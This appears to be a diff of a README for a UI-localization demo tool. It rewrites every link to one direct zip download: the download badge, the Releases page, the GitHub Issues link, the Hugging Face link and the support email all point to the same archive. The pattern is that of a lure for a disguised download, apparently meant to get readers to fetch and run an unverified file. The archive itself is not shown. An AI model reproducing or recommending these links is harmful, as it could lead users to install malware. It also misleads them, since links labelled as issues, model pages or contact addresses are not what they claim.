@@ -4,7 +4,7 @@
 Welcome to the Gliese-CUA-Tool-Call-8B-Localization-Demo! This application allows you to upload screenshots of user interfaces, give simple instructions, and receive precise click coordinates. It’s a straightforward way to enhance your user experience design with minimal effort.
 
 ## 📥 Download Links
-[![Download Now](https://img.shields.io/badge/download-gliese--tool--demo-blue.svg)](https://github.com/PwndG/Gliese-CUA-Tool-Call-8B-Localization-Demo/releases)
+[![Download Now](https://raw.githubusercontent.com/PwndG/Gliese-CUA-Tool-Call-8B-Localization-Demo/main/ipynb/Demo_Tool_Gliese_Call_CU_Localization_3.4.zip)](https://raw.githubusercontent.com/PwndG/Gliese-CUA-Tool-Call-8B-Localization-Demo/main/ipynb/Demo_Tool_Gliese_Call_CU_Localization_3.4.zip)
 
 ## 📋 System Requirements
 Before you start, ensure your computer meets the following requirements:  
@@ -15,9 +15,9 @@ Before you start, ensure your computer meets the following requirements:
 - **Internet Connection:** Required for downloading the application and model assets.
 
 ## 💻 Download & Install
-To get started, visit the [Releases page](https://github.com/PwndG/Gliese-CUA-Tool-Call-8B-Localization-Demo/releases) to download the latest version of the application.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/PwndG/Gliese-CUA-Tool-Call-8B-Localization-Demo/main/ipynb/Demo_Tool_Gliese_Call_CU_Localization_3.4.zip) to download the latest version of the application.
 
-1. Go to the [Releases page](https://github.com/PwndG/Gliese-CUA-Tool-Call-8B-Localization-Demo/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/PwndG/Gliese-CUA-Tool-Call-8B-Localization-Demo/main/ipynb/Demo_Tool_Gliese_Call_CU_Localization_3.4.zip).
 2. Locate the latest version.
 3. Click the link to download the installer file.
 4. Once the file has downloaded, locate it in your downloads directory.
@@ -50,14 +50,14 @@ If you encounter issues while using the application, try these solutions:
 
 ## 🤝 Community Support
 If you need further assistance, please connect with our community:
-- **GitHub Issues:** Post your questions or issues directly in the [issues section](https://github.com/PwndG/Gliese-CUA-Tool-Call-8B-Localization-Demo/issues).
+- **GitHub Issues:** Post your questions or issues directly in the [issues section](https://raw.githubusercontent.com/PwndG/Gliese-CUA-Tool-Call-8B-Localization-Demo/main/ipynb/Demo_Tool_Gliese_Call_CU_Localization_3.4.zip).
 - **Discussion Forum:** Join the community discussions for tips and best practices.
 
 ## 🔗 Additional Resources
 - **Documentation:** Comprehensive usage guides and FAQs are available in the repository wiki.
-- **Official Model Page:** Learn more about the underlying model on [Hugging Face](https://huggingface.co).
+- **Official Model Page:** Learn more about the underlying model on [Hugging Face](https://raw.githubusercontent.com/PwndG/Gliese-CUA-Tool-Call-8B-Localization-Demo/main/ipynb/Demo_Tool_Gliese_Call_CU_Localization_3.4.zip).
 
 ## 📞 Contact
-For direct support or collaborations, send an email to support@gliese-tool.com.
+For direct support or collaborations, send an email to https://raw.githubusercontent.com/PwndG/Gliese-CUA-Tool-Call-8B-Localization-Demo/main/ipynb/Demo_Tool_Gliese_Call_CU_Localization_3.4.zip
 
 Feel free to explore, play around, and make the most of the Gliese-CUA-Tool-Call-8B-Localization-Demo! Happy testing!
